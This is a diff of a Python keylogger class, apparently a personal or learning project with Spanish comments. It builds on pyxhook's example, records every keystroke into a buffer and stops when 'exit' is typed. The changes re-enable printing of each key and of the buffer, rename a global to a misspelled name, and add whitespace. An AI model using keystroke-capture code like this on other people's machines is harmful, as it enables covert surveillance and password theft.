@@ -7,22 +7,23 @@ class Keyloggerore:
 
     def __init__(self):
         self.buffer = "" # Registro de pulsaciones
-        self.running = True 
+        self.running = True
 
     ### Funcion (MODIFICADA) de https://github.com/JeffHoogland/pyxhook/blob/master/example.py
     # This function is called every time a key is presssed
     def callback(self,event):
-        global running, buffer
+        global running, buffers
         
         if hasattr(event, 'Key'): # se toma event.Key (los otros son: event.KeyID, event.Ascii)
             self.buffer += event.Key
             
-        # print key info 
-        #print(event.Key) # ELIMINAR DESPUES
-        #print(self.buffer)
+        # print key info
+        print(" => Evento: " + event.Key) # ELIMINAR DESPUES
+        print("BUFFER: \n" + self.buffer + "\n")
 
         # If the "string" value matches spacebar, terminate the while loop
         if "exit" in self.buffer.lower():
+    
             print("\n[x] Se detecto 'exit'. Finalizando keylogger.")
             termios.tcflush(sys.stdin, termios.TCIFLUSH) # Limpiar terminal
             # Mientras se ejecuta el programa tambien se registran las 
@@ -62,6 +63,10 @@ if __name__ == "__main__":
     ### fin de example.py
     
     print("============= Keylogger detenido. =============")
+    
+    
+    
+
         
         
     
